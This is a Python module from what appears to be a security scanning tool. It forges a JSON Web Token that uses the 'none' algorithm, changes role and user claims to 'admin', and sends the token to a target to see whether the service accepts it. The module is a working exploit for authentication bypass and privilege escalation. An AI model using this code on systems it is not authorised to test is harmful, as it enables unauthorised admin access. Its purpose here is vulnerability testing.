from typing import Any, Dict
import base64
import json
from ..http_client import HttpClient
from ..scenarios import FlowScenario, SimpleScenario 
# Note: JWT attacks usually require a captured token, so this fits best in a Flow 
# OR a SimpleScenario where we explicitly provided a token in config. 
# But to make it "Real", we should modify an existing token.

def _b64url_encode(data: Dict) -> str:
    json_str = json.dumps(data, separators=(",", ":"))
    encoded = base64.urlsafe_b64encode(json_str.encode()).decode().rstrip("=")
    return encoded

def _decode_jwt(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        return None, None
    try:
        header = json.loads(base64.urlsafe_b64decode(parts[0] + "==").decode())
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + "==").decode())
        return header, payload
    except:
        return None, None

def run_jwt_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
    """
    JWT None Algorithm & Weak Signature Attack.
    Requires a valid 'base_token' in config (usually fetched in a previous flow step).
    """
    base_token = scenario.config.get("token")
    if not base_token or base_token.startswith("{{"):
        return {
            "scenario_id": scenario.id,
            "passed": False, # Cannot test without token
            "details": "Skipped: No valid base_token provided for JWT attack"
        }

    header, payload = _decode_jwt(base_token)
    if not header:
        return {
            "scenario_id": scenario.id,
            "passed": True, 
            "details": "Base token is not a valid JWT (cannot attack)"
        }
    
    issues = []
    
    # ATTACK 1: The "None" Algorithm
    # Header: { "alg": "none" }
    # Signature: empty
    
    rogue_header = header.copy()
    rogue_header["alg"] = "none"
    
    # Escalate privileges if possible
    rogue_payload = payload.copy()
    if "role" in rogue_payload:
        rogue_payload["role"] = "admin"
    if "user" in rogue_payload:
        rogue_payload["user"] = "admin"
    if "admin" in rogue_payload:
        rogue_payload["admin"] = True
        
    fake_token = f"{_b64url_encode(rogue_header)}.{_b64url_encode(rogue_payload)}."
    
    # Send request with fake token
    # We need to know WHERE to put it. Authorization header usually.
    
    resp = client.send(
        scenario.method, 
        scenario.target, 
        headers={"Authorization": f"Bearer {fake_token}"}
    )
    
    # If 200 OK and we are NOT 401/403, it's a critical fail.
    # Check body for "admin" evidence if we tried to escalate.
    
    if resp.status_code == 200:
        evidence = []
        if "admin" in resp.text.lower():
            evidence.append("Page contains 'admin' (Privilege Escalation)")
        else:
            evidence.append("Request accepted (Status 200)")
            
        issues.append(
            f"\n    [CRITICAL] JWT 'None' Algorithm accepted!\n"
            f"    Forged Token: {fake_token}\n"
            f"    Response: {resp.status_code}\n"
            f"    Evidence: {', '.join(evidence)}"
        )
        
    return {
        "scenario_id": scenario.id,
        "attack_type": "jwt_weakness",
        "passed": len(issues) == 0,
        "details": {
            "issues": issues
        }
    }
